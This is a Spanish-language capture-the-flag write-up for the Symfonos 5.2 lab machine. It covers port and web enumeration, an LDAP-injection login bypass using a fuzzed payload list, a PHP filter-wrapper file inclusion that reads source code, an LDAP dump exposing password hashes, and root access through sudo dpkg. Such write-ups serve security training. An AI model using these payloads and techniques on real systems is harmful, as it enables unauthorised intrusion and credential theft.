# SYMFONOS: 5.2

![zeus](https://github.com/user-attachments/assets/9005fc5c-cffd-43ec-b9fa-c5cfaf66c5e6)

# 
## 1. Enumeración de puertos
```console
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-26 09:19 CST
Nmap scan report for 192.168.56.25
Host is up (0.010s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
636/tcp open  ldapssl
MAC Address: 08:00:27:FD:68:71 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.98 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-26 09:20 CST
Nmap scan report for 192.168.56.25
Host is up (0.0030s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:FD:68:71 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1813.76 seconds
```

## 2 Enumeración del servidor web
```console
dirb http://symfonos.local

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Nov 29 20:34:37 2025
URL_BASE: http://symfonos.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                        GENERATED WORDS: 4612

---- Scanning URL: http://symfonos.local/ ----
                                                                        + http://symfonos.local/admin.php (CODE:200|SIZE:1650)
+ http://symfonos.local/index.html (CODE:200|SIZE:207)
+ http://symfonos.local/server-status (CODE:403|SIZE:279)
                                                                        ==> DIRECTORY: http://symfonos.local/static/

---- Entering directory: http://symfonos.local/static/ ----
                                                                        (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sat Nov 29 20:34:41 2025
DOWNLOADED: 4612 - FOUND: 3
```

## 2.1 Login Bypass via LDAP injection
```console
 ffuf -u "http://symfonos.local/admin.php?username=FUZZ&password=pass" -w /usr/share/wordlists/LDAP_injection.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://symfonos.local/admin.php?username=FUZZ&password=pass
 :: Wordlist         : FUZZ: /usr/share/wordlists/LDAP_injection.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

//                      [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 38ms]
*/*                     [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 43ms]
/                       [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 44ms]
*(|(objectclass=*))     [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 44ms]
*()|%26'                [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 45ms]
*)(&                    [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 43ms]
*(|(mail=*))            [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 46ms]
admin*)((|userPassword=*) [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 48ms]
admin*)((|userpassword=*) [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 51ms]
admin*                  [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 55ms]
//*                     [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 55ms]
*)(uid=*))(|(uid=*      [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 57ms]
*))%00                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
*|                      [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 87ms]
@*                      [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 88ms]
*()|&'                  [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 90ms]
|                       [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 92ms]
*                       [Status: 200, Size: 1663, Words: 708, Lines: 40, Duration: 96ms]
:: Progress: [19/19] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

<img width="770" height="285" alt="2025-11-29-203800_770x285_scrot" src="https://github.com/user-attachments/assets/a51153e2-2737-4fdb-971b-33b93658c696" />

## 2.2 LFI + PHP wrappers
```
curl -s "http://symfonos.local/home.php?url=php://filter/convert.base64-encode/resource=admin.php" -H "Cookie: PHPSESSID=vnopbg5f0q9terq1b235dginrv" > output.html
// Extraemos el contenido en base64 del html con algun editor de texto
base64 -d output.html > admin.php
```

## 3 Enumeración del servidor LDAP
```console
 ldapsearch -x -LLL -b "dc=symfonos,dc=local" -w "qMDdyZh3cT6eeAWD" -D "cn=admin,dc=symfonos,dc=local" -H ldap://symfonos.local
dn: dc=symfonos,dc=local
objectClass: top
objectClass: dcObject
objectClass: organization
o: symfonos
dc: symfonos

dn: cn=admin,dc=symfonos,dc=local
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User
```

## 4 Abuso de binario con privilegios sudo
```console
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
zeus@symfonos5:~$ sudo dpkg -l
```

<img width="1342" height="623" alt="2025-11-29-231734_1342x623_scrot" src="https://github.com/user-attachments/assets/dc5a01b2-4e42-4b93-9bb6-1649e77d7ee6" />

```console
root@symfonos5:/home/zeus# cat /root/proof.txt

                    Congrats on rooting symfonos:5!

                                   ZEUS
              *      .            dZZZZZ,       .          *
                                 dZZZZ  ZZ,
     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
                    ,ZZZZZZV'      ZZZZ   `Z,`\
                  ,ZZZ    ZZ   .    ZZZZ   `V
        *      ZZZZV'     ZZ         ZZZZ    \_              .
.              V   l   .   ZZ        ZZZZZZ          .
               l    \       ZZ,     ZZZ  ZZZZZZ,
   .          /            ZZ l    ZZZ    ZZZ `Z,
                          ZZ  l   ZZZ     Z Z, `Z,            *
                .        ZZ      ZZZ      Z  Z, `l
                         Z        ZZ      V  `Z   \
                         V        ZZC     l   V
           Z             l        V ZR        l      .
            \             \       l  ZA
                            \         C          C
                                  \   K   /    /             K
                          A    \   \  |  /  /              /
                           \        \\|/ /  /
   __________________________________\|/_________________________
            Contact me via Twitter @zayotic to give feedback!
```
